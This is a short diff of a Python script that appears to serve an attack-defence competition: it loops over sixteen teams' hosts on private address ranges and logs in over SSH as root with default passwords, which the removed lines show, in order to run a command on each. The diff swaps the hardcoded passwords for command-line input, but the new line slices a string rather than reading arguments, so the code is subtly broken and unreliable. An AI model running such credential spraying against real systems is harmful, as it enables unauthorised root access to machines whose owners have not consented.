@@ -42,7 +42,7 @@ command = """
 
 """
 
-default_passwords = ["Chiapet1", "SuperChiaPet10"]
+default_passwords = str(sys.argv)[1:]
 
 
 # each team
@@ -53,3 +53,9 @@ for team in range(16):
 		for password in default_passwords:
 			asyncio.run(ssh(user="root", host=f"10.{team}.1.{server}", cmd=command, password=password))
 			asyncio.run(ssh(user="root", host=f"172.16.{team}.{server}", cmd=command, password=password))
+
+
+
+
+
+
